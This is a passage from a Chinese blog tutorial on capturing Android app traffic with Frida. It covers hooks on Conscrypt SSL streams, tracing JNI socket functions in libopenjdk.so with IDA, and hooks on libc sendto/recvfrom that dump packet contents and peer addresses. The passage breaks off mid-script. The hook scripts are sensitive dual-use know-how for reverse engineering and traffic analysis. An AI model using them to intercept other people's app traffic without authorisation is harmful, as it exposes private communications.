class="property">value</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">var</span> size = <span class="variable language_">this</span>.<span class="title function_">read</span>(arg0, arg1, arg2)</span><br><span class="line">            <span class="keyword">var</span> bytearray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, arg0)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;size; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_">isprintable</span>(bytearray[i]))</span><br><span class="line">                    content = content + <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(bytearray[i])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\naddress:&quot;</span> + socketobj + <span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]SSLInputStream.read:&quot;</span> + content)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="keyword">return</span> size</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">SSLOutputStreamClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.OpenSSLSocketImpl$SSLOutputStream&quot;</span>)</span><br><span class="line">        <span class="title class_">SSLOutputStreamClass</span>.<span class="property">write</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0, arg1, arg2</span>)&#123;</span><br><span class="line">            <span class="comment">//获得内部类对象所属的外部类对象</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">OpenSSLSocektImplobj</span> = <span class="variable language_">this</span>.<span class="property">this$0</span>.<span class="property">value</span></span><br><span class="line">            <span class="keyword">var</span> socketobj = <span class="title class_">OpenSSLSocektImplobj</span>.<span class="property">socket</span>.<span class="property">value</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">SSL_write</span>(arg0, arg1, arg2)</span><br><span class="line">            <span class="keyword">var</span> bytearray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, arg0)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;arg2; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_">isprintable</span>(bytearray[i]))</span><br><span class="line">                    content = content + <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(bytearray[i])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\naddress:&quot;</span> + socketobj + <span class="string">&quot;\n&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>) + <span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]SSLOutputStream.write:&quot;</span> + content)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hookssl2</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/2.1.4.png" class=""><img src="/posts/bdcbf47/2.1.5.png" class=""><p>如果一个App有多个进程，在当前进程抓不到包的情况下可以hook App的其它进程试试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -p [PID] -l hookssl2.js --no-pause -o log.txt</span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/2.1.6.png" class=""><h1 id="3-JNI层Socket抓包"><a href="#3-JNI层Socket抓包" class="headerlink" title="3. JNI层Socket抓包"></a>3. JNI层Socket抓包</h1><p>JNI函数是Java层和JNI层的桥梁。</p><h2 id="3-1-TCP"><a href="#3-1-TCP" class="headerlink" title="3.1 TCP"></a>3.1 TCP</h2><p>比如在TCP中跟踪到的JNI函数是<code>socketRead0()</code>和<code>socketWrite0()</code>，如何更进一步去到JNI层呢？在Google安卓源码当中，JNI函数有独特的命名规则，即类名_方法名。这种命名方法表示动态注册，即需要JNI_OnLoad。</p><img src="/posts/bdcbf47/3.1.1.png" class=""><img src="/posts/bdcbf47/3.1.2.png" class=""><img src="/posts/bdcbf47/3.1.3.png" class=""><img src="/posts/bdcbf47/3.1.4.png" class=""><p>那它们是在哪个so文件中呢？知道在哪个so文件中后，用IDA交叉引用功能快速知道通过libc哪个API完成数据的发送与接收。</p><p>在编译的安卓源码中找到哪里调用到了C文件，再打开mk文件查看是否有模块名。如果没有再查看哪里调用了该mk文件，打开新找到的mk文件查看是否有模块名，以此类推。</p><img src="/posts/bdcbf47/3.1.5.png" class=""><img src="/posts/bdcbf47/3.1.6.png" class=""><p>最后可以看到模块名为<code>libopenjdkd</code>。</p><img src="/posts/bdcbf47/3.1.7.png" class=""><p>可以去手机当中将这个so文件导出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb pull /system/lib/libopenjdk.so</span><br><span class="line">adb pull /system/lib64/libopenjdk.so libopenjdk64.so//重命名为libopenjdk64.so</span><br></pre></td></tr></table></figure><p>加载进IDA中，由于是动态注册的，所以直接找JNI_OnLoad。</p><img src="/posts/bdcbf47/3.1.9.png" class=""><img src="/posts/bdcbf47/3.1.8.png" class=""><p>在<code>SocketInputStream_socketRead0()</code>中调用了<code>j_NET_Read()</code>读取数据；在<code>SocketOutputStream_socketWrite0()</code>中调用了<code>j_NET_Send()</code>发送数据。</p><p>在1.1中只拿到了Java层的调用栈，可以继续补充JNI层的函数得到从Java层到JNI层的完整的调用栈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">接收数据：</span><br><span class="line">socketRead0(jni函数)-&gt;</span><br><span class="line">NET_Read-&gt;</span><br><span class="line">ssize_t recvfrom(int fd, void *buf, size_t n, int flags, struct sockaddr *addr, socklen_t *addr_len)(libc函数)</span><br><span class="line">//进入libc.so中在导出函数表找到recvfrom，系统调用号为292，syscall:292</span><br><span class="line"></span><br><span class="line">发送数据：</span><br><span class="line">socketWrite0(jni函数)-&gt;</span><br><span class="line">NET_Send-&gt;</span><br><span class="line">ssize_t sendto(int fd, const void *buf, size_t n, int flags, struct sockaddr *addr, socklen_t *addr_len)(libc函数)</span><br><span class="line">//syscall:290</span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/3.1.10.png" class=""><img src="/posts/bdcbf47/3.1.11.png" class=""><p>如果App使用Java框架层的API来进行通信，Java层抓包可以直接打印出Java层的调用栈信息，而不需要关心JNI层的调用栈信息。但对于一些使用libc系统层函数进行通信的App，使用Java层就会抓不到包，所以必须对JNI层进行hook。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printNativeStack</span>(<span class="params">context, name</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>)</span><br><span class="line">    <span class="keyword">var</span> first = <span class="title class_">DebugSymbol</span>.<span class="title function_">fromAddress</span>(array[<span class="number">0</span>])</span><br><span class="line">    <span class="comment">//在Java层没有找到才打印JNI层中的信息，避免重复打印</span></span><br><span class="line">    <span class="keyword">if</span>(first.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;libopenjdk.so!NET_Send&quot;</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> trace = <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>).<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]start:&quot;</span> + name)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + trace)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]end:&quot;</span> + name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getsocketdetail</span>(<span class="params">fd</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">var</span> type = <span class="title class_">Socket</span>.<span class="title function_">type</span>(fd)</span><br><span class="line">    <span class="keyword">if</span> (type != <span class="literal">null</span>)&#123;</span><br><span class="line">        result = result + <span class="string">&quot;type:&quot;</span> + type</span><br><span class="line">        <span class="keyword">var</span> peer = <span class="title class_">Socket</span>.<span class="title function_">peerAddress</span>(fd)</span><br><span class="line">        <span class="keyword">var</span> local = <span class="title class_">Socket</span>.<span class="title function_">localAddress</span>(fd)</span><br><span class="line">        result = result + <span class="string">&quot;,address:&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(peer) + <span class="string">&quot;,local&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(local)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        result = <span class="string">&quot;unknown&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooklibc</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> libcmoudle = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> recvfrom_addr = libcmoudle.<span class="title function_">getExportByName</span>(<span class="string">&quot;recvfrom&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> sendto_addr = libcmoudle.<span class="title function_">getExportByName</span>(<span class="string">&quot;sendto&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(recvfrom_addr + <span class="string">&quot;---&quot;</span> + sendto_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(recvfrom_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;go into libc.so-&gt;recvfrom&quot;</span>)</span><br><span class="line">            <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>,<span class="string">&quot;recvfrom&quot;</span>)</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> size = retval.<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> result = <span class="title function_">getsocketdetail</span>(<span class="variable language_">this</span>.<span class="property">arg0</span>.<span class="title function_">toInt32</span>())</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(result + <span class="string">&quot;---libc.so-&gt;recvfrom:\n&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                <span class="attr">length</span>:size</span><br><span class="line">            &#125;))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;leave libc.so-&gt;recvfrom&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sendto_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]go into libc.so-&gt;sendto&quot;</span>)</span><br><span class="line">            <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>,<span class="string">&quot;sendto&quot;</span>)</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> size = <span class="title function_">ptr</span>(<span class="variable language_">this</span>.<span class="property">arg2</span>).<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> result = <span class="title function_">getsocketdetail</span>(<span class="variable language_">this</span>.<span class="property">arg0</span>.<span class="title function_">toInt32</span>())</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(result + <span class="string">&quot;---libc.so-&gt;sendto:\n&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                    <span class="attr">length</span>:size</span><br><span class="line">                &#125;))                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]leave libc.so-&gt;sendto&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hooklibc</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/3.1.12.png" class=""><p>使用Socket通信时，TCP通常用<code>libc.so</code>中的<code>send()</code>和<code>recv()</code>通信，而UDP通常用<code>libc.so</code>中的<code>sendto()</code>和<code>recvfrom()</code>通信。但hook <code>sendto()</code>和<code>recvfrom()</code>为什么能抓到TCP的包呢？是因为在<code>libc.so</code>当中，<code>send()</code>和<code>recv()</code>里面调用的就是<code>sendto()</code>和<code>recvfrom()</code>。</p><h2 id="3-2-UDP"><a href="#3-2-UDP" class="headerlink" title="3.2 UDP"></a>3.2 UDP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">发送数据：</span><br><span class="line">sendtoBytes(jni函数)-&gt;</span><br><span class="line">NET_IPV4_FALLBACK(env, ssize_t, sendto, javaFd, javaInetAddress, port, NULL_ADDR_OK, bytes.get() + byteOffset, byteCount, flags)-&gt;</span><br><span class="line">sendto(libc函数)</span><br><span class="line"></span><br><span class="line">接收数据：</span><br><span class="line">recvfromBytes(jni函数)-&gt;</span><br><span class="line">NET_FAILURE_RETRY(env, ssize_t, recvfrom, javaFd, bytes.get() + byteOffset, byteCount, flags, from, fromLength)-&gt;</span><br><span class="line">recvfrom(libc函数)</span><br></pre></td></tr></table></figure><p>可以看到最后还是转到对<code>sendto()</code>和<code>recvfrom()</code>上来，所以直接用TCP中hook <code>sendto()</code>和<code>recvfrom()</code>脚本即可。</p><p>但是对端的IP地址与端口显示null，所以还需要对脚本做一下修改：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printNativeStack</span>(<span class="params">context, name</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>)</span><br><span class="line">    <span class="keyword">var</span> first = <span class="title class_">DebugSymbol</span>.<span class="title function_">fromAddress</span>(array[<span class="number">0</span>])</span><br><span class="line">    <span class="comment">//在Java层没有找到才打印JNI层中的信息，避免重复打印</span></span><br><span class="line">    <span class="keyword">if</span>(first.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;libopenjdk.so!NET_Send&quot;</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> trace = <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>).<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]start:&quot;</span> + name)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + trace)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]end:&quot;</span> + name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getsocketdetail</span>(<span class="params">fd</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">var</span> type = <span class="title class_">Socket</span>.<span class="title function_">type</span>(fd)</span><br><span class="line">    <span class="keyword">if</span> (type != <span class="literal">null</span>)&#123;</span><br><span class="line">        result = result + <span class="string">&quot;type:&quot;</span> + type</span><br><span class="line">        <span class="keyword">var</span> peer = <span class="title class_">Socket</span>.<span class="title function_">peerAddress</span>(fd)</span><br><span class="line">        <span class="keyword">var</span> local = <span class="title class_">Socket</span>.<span class="title function_">localAddress</span>(fd)</span><br><span class="line">        result = result + <span class="string">&quot;,address:&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(peer) + <span class="string">&quot;,local&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(local)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        result = <span class="string">&quot;unknown&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getip</span>(<span class="params">ip_ptr</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">ptr</span>(ip_ptr).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">1</span>)).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">2</span>)).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">3</span>)).<span class="title function_">readU8</span>()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getudpaddr</span>(<span class="params">addrptr</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> port_ptr = addrptr.<span class="title function_">add</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">var</span> port = <span class="title function_">ptr</span>(port_ptr).<span class="title function_">readU8</span>()*<span class="number">256</span> + <span class="title function_">ptr</span>(port_ptr.<span class="title function_">add</span>(<span class="number">1</span>)).<span class="title function_">readU8</span>()</span><br><span class="line">    <span class="keyword">var</span> ip_ptr = addrptr.<span class="title function_">add</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">var</span> ip_addr = <span class="title function_">getip</span>(ip_ptr)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;peer:&quot;</span> + ip_addr + <span class="string">&quot;,port:&quot;</span> + port</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooklibc</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> libcmoudle = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> recvfrom_addr = libcmoudle.<span class="title function_">getExportByName</span>(<span class="string">&quot;recvfrom&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> sendto_addr = libcmoudle.<span class="title function_">getExportByName</span>(<span class="string">&quot;sendto&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(recvfrom_addr + <span class="string">&quot;---&quot;</span> + sendto_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(recvfrom_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg3</span> = args[<span class="number">3</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg4</span> = args[<span class="number">4</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg5</span> = args[<span class="number">5</span>]</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;go into libc.so-&gt;recvfrom&quot;</span>)</span><br><span class="line">            <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>,<span class="string">&quot;recvfrom&quot;</span>)</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> size = retval.<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size&gt;<span 